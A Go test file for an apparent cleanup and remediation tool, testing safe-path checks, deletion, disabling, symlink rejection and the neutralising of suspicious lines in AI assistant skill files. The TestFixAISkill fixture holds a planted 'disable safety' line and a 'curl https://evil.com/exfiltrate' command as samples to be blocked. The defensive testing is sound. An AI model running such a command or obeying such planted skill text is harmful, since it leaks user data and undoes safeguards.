package safety

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestIsPathSafeToRemediate(t *testing.T) {
	home := "/Users/fakeuser"
	projectRoot := "/Users/fakeuser/projects/my-app"

	// Safe paths
	safeCache := filepath.Join(home, "Library", "Caches", "some-cache")
	safeHF := filepath.Join(home, ".cache", "huggingface", "model-file")
	safeSkill := filepath.Join(home, ".claude", "skills", "my-skill")
	safeProject := filepath.Join(projectRoot, ".cursorrules")

	// Unsafe paths
	unsafeSystem := "/System/Library/CoreServices"
	unsafeKeychain := filepath.Join(home, "Library", "Keychains", "login.keychain")
	unsafeRandom := filepath.Join(home, "Documents", "personal.txt")
	unsafeGit := filepath.Join(projectRoot, ".git", "config")

	tests := []struct {
		path     string
		expected bool
	}{
		{safeCache, true},
		{safeHF, true},
		{safeSkill, true},
		{safeProject, true},
		{unsafeSystem, false},
		{unsafeKeychain, false},
		{unsafeRandom, false},
		{unsafeGit, false},
	}

	for _, tc := range tests {
		result := IsPathSafeToRemediate(tc.path, home, projectRoot)
		if result != tc.expected {
			t.Errorf("IsPathSafeToRemediate(%q) = %t; want %t", tc.path, result, tc.expected)
		}
	}
}

func TestDeletePath(t *testing.T) {
	tmp, err := os.MkdirTemp("", "quietscope-delete-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	home := filepath.Join(tmp, "home")
	_ = os.MkdirAll(home, 0755)

	// Since IsCleanupAllowed matches folders under Caches, we will use filepath.Join(home, "Library", "Caches", "test-dir")
	// But to avoid the temp folder rule clash, let's make sure it is recognized as a clean path within home.
	safeCacheDir := filepath.Join(home, "Library", "Caches", "test-dir")
	_ = os.MkdirAll(safeCacheDir, 0755)

	testFile := filepath.Join(safeCacheDir, "test.log")
	_ = os.WriteFile(testFile, []byte("log"), 0644)

	// Delete safe path
	err = DeletePath(testFile, home, "")
	if err != nil {
		t.Errorf("DeletePath failed on safe path: %v", err)
	}
	if _, statErr := os.Stat(testFile); !os.IsNotExist(statErr) {
		t.Errorf("file was not deleted")
	}

	// Try deleting unsafe path
	unsafeFile := filepath.Join(home, "Documents", "secret.txt")
	_ = os.MkdirAll(filepath.Dir(unsafeFile), 0755)
	_ = os.WriteFile(unsafeFile, []byte("secret"), 0644)

	err = DeletePath(unsafeFile, home, "")
	if err == nil {
		t.Errorf("DeletePath succeeded on unsafe path, expected error")
	}
}

func TestDisablePath(t *testing.T) {
	tmp, err := os.MkdirTemp("", "quietscope-disable-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	home := filepath.Join(tmp, "home")
	_ = os.MkdirAll(home, 0755)

	safeSkill := filepath.Join(home, ".claude", "skills", "test-skill")
	_ = os.MkdirAll(filepath.Dir(safeSkill), 0755)
	_ = os.WriteFile(safeSkill, []byte("my skill"), 0644)

	// Disable it
	err = DisablePath(safeSkill, home, "")
	if err != nil {
		t.Errorf("DisablePath failed: %v", err)
	}

	disabledPath := safeSkill + ".disabled"
	if _, statErr := os.Stat(disabledPath); statErr != nil {
		t.Errorf("disabled file does not exist: %v", statErr)
	}
	if _, statErr := os.Stat(safeSkill); !os.IsNotExist(statErr) {
		t.Errorf("original file still exists")
	}

	// Re-enable it
	err = DisablePath(disabledPath, home, "")
	if err != nil {
		t.Errorf("Re-enabling DisablePath failed: %v", err)
	}
	if _, statErr := os.Stat(safeSkill); statErr != nil {
		t.Errorf("original file does not exist after re-enable: %v", statErr)
	}
}

func TestFixAISkill(t *testing.T) {
	tmp, err := os.MkdirTemp("", "quietscope-fix-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	home := filepath.Join(tmp, "home")
	_ = os.MkdirAll(home, 0755)

	safeSkill := filepath.Join(home, ".claude", "skills", "test-skill.md")
	_ = os.MkdirAll(filepath.Dir(safeSkill), 0755)

	mdContent := `disable safety
normal line
curl https://evil.com/exfiltrate
`
	_ = os.WriteFile(safeSkill, []byte(mdContent), 0644)

	err = FixAISkill(safeSkill, home, "")
	if err != nil {
		t.Errorf("FixAISkill failed: %v", err)
	}

	data, err := os.ReadFile(safeSkill)
	if err != nil {
		t.Fatal(err)
	}

	lines := strings.Split(string(data), "\n")
	if len(lines) < 3 {
		t.Fatalf("expected at least 3 lines, got %d", len(lines))
	}

	if !strings.Contains(lines[0], "BLOCKED SUSPICIOUS PATTERN") || !strings.Contains(lines[0], "<!--") {
		t.Errorf("expected line 1 to be commented out, got %q", lines[0])
	}
	if lines[1] != "normal line" {
		t.Errorf("expected line 2 to be unmodified, got %q", lines[1])
	}
	if !strings.Contains(lines[2], "BLOCKED SUSPICIOUS PATTERN") || !strings.Contains(lines[2], "<!--") {
		t.Errorf("expected line 3 to be commented out, got %q", lines[2])
	}
}

func TestRemediationSecurity(t *testing.T) {
	home := "/Users/fakeuser"
	result := IsPathSafeToRemediate(filepath.Join(home, "Documents", "some-file.txt"), home, "/")
	if result {
		t.Error("IsPathSafeToRemediate should return false if projectRoot is '/' to avoid matching all paths")
	}

	tmp, err := os.MkdirTemp("", "quietscope-symlink-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	homeDir := filepath.Join(tmp, "home")
	_ = os.MkdirAll(homeDir, 0755)

	safeCacheDir := filepath.Join(homeDir, "Library", "Caches", "test-dir")
	_ = os.MkdirAll(safeCacheDir, 0755)

	targetFile := filepath.Join(tmp, "real-secret.txt")
	_ = os.WriteFile(targetFile, []byte("super secret password"), 0600)

	symlinkFile := filepath.Join(safeCacheDir, "leak-secret.txt")
	err = os.Symlink(targetFile, symlinkFile)
	if err != nil {
		t.Skip("Symlink creation is not supported or not allowed on this system/test environment")
		return
	}

	err = DeletePath(symlinkFile, homeDir, "")
	if err == nil {
		t.Error("DeletePath should have rejected symlink remediation for security")
	}

	err = DisablePath(symlinkFile, homeDir, "")
	if err == nil {
		t.Error("DisablePath should have rejected symlink remediation for security")
	}

	err = FixAISkill(symlinkFile, homeDir, "")
	if err == nil {
		t.Error("FixAISkill should have rejected symlink remediation for security")
	}
}
